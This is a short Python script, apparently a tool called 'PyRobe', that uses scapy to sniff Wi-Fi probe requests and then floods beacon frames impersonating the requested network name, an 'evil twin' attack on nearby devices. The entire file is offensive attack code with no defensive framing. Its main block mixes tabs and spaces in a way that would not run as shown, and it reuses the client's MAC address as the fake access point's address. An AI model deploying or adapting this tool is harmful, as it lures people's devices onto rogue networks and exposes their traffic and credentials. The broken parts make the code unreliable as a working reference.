#!/usr/bin/env python3
# import all the needed libraries
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
import datetime
import time

# clear the console
call(["clear"])                                           

# define variables    
interface = 0                                                      
ssid_wanted = 0
unique_ssid = []

# our packet handler        
# here we want to generate 1 evil twin per unique SSID corresponding to the SSID wanted by the user in the arguments                                                  
def phandle(p):                       
    if p.haslayer(Dot11ProbeReq):                         
        mac = str(p.addr2)
        if p.haslayer(Dot11Elt):                          
            ssid = str(p.info.decode())
            if ssid == ssid_wanted and ssid not in unique_ssid:
                unique_ssid.append(ssid)
                print ("SSID : " + ssid)       
                print ("MAC : " + mac)
                evil_twin(mac, ssid, 7)
            
			
# our evil twin generator
def evil_twin(mac, ssid, channel):
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=mac, addr3=mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    channel_packet = Dot11Elt(ID='DSset', info=chr(channel))
    
    # prepare packet with all parameters
    packet = RadioTap()/dot11/beacon/essid/channel_packet
    
    print("Press Ctrl+C if you want to stop sending packets")
    
    # send packet
    sendp(packet, iface=interface, inter=0.100, loop=1)
                
# our main function             
if __name__ == "__main__":

	#managing arguments
    import argparse
    parser = argparse.ArgumentParser(description='PyRobe Help')
    parser.add_argument('interface', action="store", help="specify interface (ex. mon0)", default=False)
    parser.add_argument("-s", "--ssid", action="store")
    args = parser.parse_args()
	ssid_wanted = args.ssid
	interface = args.interface
	
	#sniffing the network and managing packets
	sniff(iface=args.interface,prn=phandle, store=0)                    
	print ("\n")
	print ("Exiting!")

        
   